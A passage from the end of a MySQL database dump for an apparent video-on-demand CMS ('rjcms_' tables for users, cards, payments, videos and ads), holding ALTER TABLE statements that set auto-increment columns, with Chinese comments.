  ADD KEY `c_hide` (`c_hide`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `rjcms_ad`
--
ALTER TABLE `rjcms_ad`
  MODIFY `id` smallint(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- 使用表AUTO_INCREMENT `rjcms_adclass`
--
ALTER TABLE `rjcms_adclass`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- 使用表AUTO_INCREMENT `rjcms_book`
--
ALTER TABLE `rjcms_book`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- 使用表AUTO_INCREMENT `rjcms_fav`
--
ALTER TABLE `rjcms_fav`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- 使用表AUTO_INCREMENT `rjcms_link`
--
ALTER TABLE `rjcms_link`
  MODIFY `l_id` smallint(6) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- 使用表AUTO_INCREMENT `rjcms_manager`
--
ALTER TABLE `rjcms_manager`
  MODIFY `m_id` smallint(6) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用表AUTO_INCREMENT `rjcms_nav`
--
ALTER TABLE `rjcms_nav`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- 使用表AUTO_INCREMENT `rjcms_play`
--
ALTER TABLE `rjcms_play`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- 使用表AUTO_INCREMENT `rjcms_player`
--
ALTER TABLE `rjcms_player`
  MODIFY `id` smallint(6) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=125;

--
-- 使用表AUTO_INCREMENT `rjcms_slideshow`
--
ALTER TABLE `rjcms_slideshow`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- 使用表AUTO_INCREMENT `rjcms_system`
--
ALTER TABLE `rjcms_system`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- 使用表AUTO_INCREMENT `rjcms_user`
--
ALTER TABLE `rjcms_user`
  MODIFY `u_id` mediumint(8) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- 使用表AUTO_INCREMENT `rjcms_userka`
--
ALTER TABLE `rjcms_userka`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用表AUTO_INCREMENT `rjcms_user_card`
--
ALTER TABLE `rjcms_user_card`
  MODIFY `c_id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=360;

--
-- 使用表AUTO_INCREMENT `rjcms_user_cardclass`
--
ALTER TABLE `rjcms_user_cardclass`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- 使用表AUTO_INCREMENT `rjcms_user_group`
--
ALTER TABLE `rjcms_user_group`
  MODIFY `ug_id` smallint(6) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- 使用表AUTO_INCREMENT `rjcms_user_pay`
--
ALTER TABLE `rjcms_user_pay`
  MODIFY `p_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- 使用表AUTO_INCREMENT `rjcms_user_visit`
--
ALTER TABLE `rjcms_user_visit`
  MODIFY `uv_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用表AUTO_INCREMENT `rjcms_vod`
--
ALTER TABLE `rjcms_vod`
  MODIFY `d_id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=102;

--
-- 使用表AUTO_INCREMENT `rjcms_vod_class`
--
ALTER TABLE `rjcms_vod_class`
  MODIFY `c_id` smallint(6) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=126;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
